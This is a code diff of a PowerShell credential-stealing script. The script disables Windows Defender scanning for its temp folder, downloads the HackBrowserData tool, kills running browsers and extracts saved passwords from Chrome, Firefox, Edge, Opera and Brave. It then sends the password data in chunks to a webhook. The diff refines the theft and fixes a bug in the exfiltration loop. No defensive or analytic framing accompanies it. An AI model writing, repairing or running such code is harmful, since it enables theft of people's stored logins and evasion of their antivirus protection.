@@ -36,9 +36,9 @@ try {
     # Add temp directory to Windows Defender exclusion
     Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
     
-    # Download latest HackBrowserData version with Windows 11 support
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
-    $zipPath = "$tempDir\hbd.zip"
+    # Download newer HackBrowserData version with Windows 11 support
+$hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
+$zipPath = "$tempDir\hbd.zip"
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
@@ -49,21 +49,29 @@ try {
     
     # Force close browsers before extraction
     taskkill /f /im chrome.exe /im firefox.exe /im msedge.exe /im opera.exe /im brave.exe 2>$null
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 3
     
-    # Run HackBrowserData with elevated privileges
+    # Try running as current user first
     $exePath = "$tempDir\hack-browser-data.exe"
     if(Test-Path $exePath) {
-        # Try to run with admin privileges and verbose output
-        Start-Process -FilePath $exePath -ArgumentList "-b all -f json --dir $tempDir -vv" -WindowStyle Normal -Wait
+        # Run with verbose output and check all browser types
+        $process = Start-Process -FilePath $exePath -ArgumentList "-b chrome,firefox,edge,opera,brave -f json --dir $tempDir -vv" -WindowStyle Normal -Wait -PassThru
+        $exitCode = $process.ExitCode
         Start-Sleep -Seconds 10
         
         # Debug: List all files in temp directory
         $allFiles = Get-ChildItem -Path $tempDir -Recurse
-        $debugInfo = "Files found: " + ($allFiles.Count) + "`n"
+        $debugInfo = "Files found: " + ($allFiles.Count) + " Exit code: $exitCode`n"
         foreach($file in $allFiles) {
             $debugInfo += $file.Name + "`n"
         }
+        
+        # Debug: Check common browser data paths
+        $paths = @()
+        $paths += "Chrome: " + (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")
+        $paths += "Firefox: " + (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles")
+        $paths += "Edge: " + (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data")
+        $debugInfo += "Browser paths: " + ($paths -join ", ")
         
         # Read the password file
         $jsonFile = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse | Select-Object -First 1
@@ -120,7 +128,7 @@ $browsers
 $maxLen = 1900
 if($output.Length -gt $maxLen) {
     for($i = 0; $i -lt $output.Length; $i += $maxLen) {
-        $chunk = $output.Substring($i, [Math::Min($maxLen, $output.Length - $i))
+        $chunk = $output.Substring($i, [Math]::Min($maxLen, $output.Length - $i))
         $body = @{ content = $chunk } | ConvertTo-Json
         Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
         Start-Sleep -Milliseconds 500
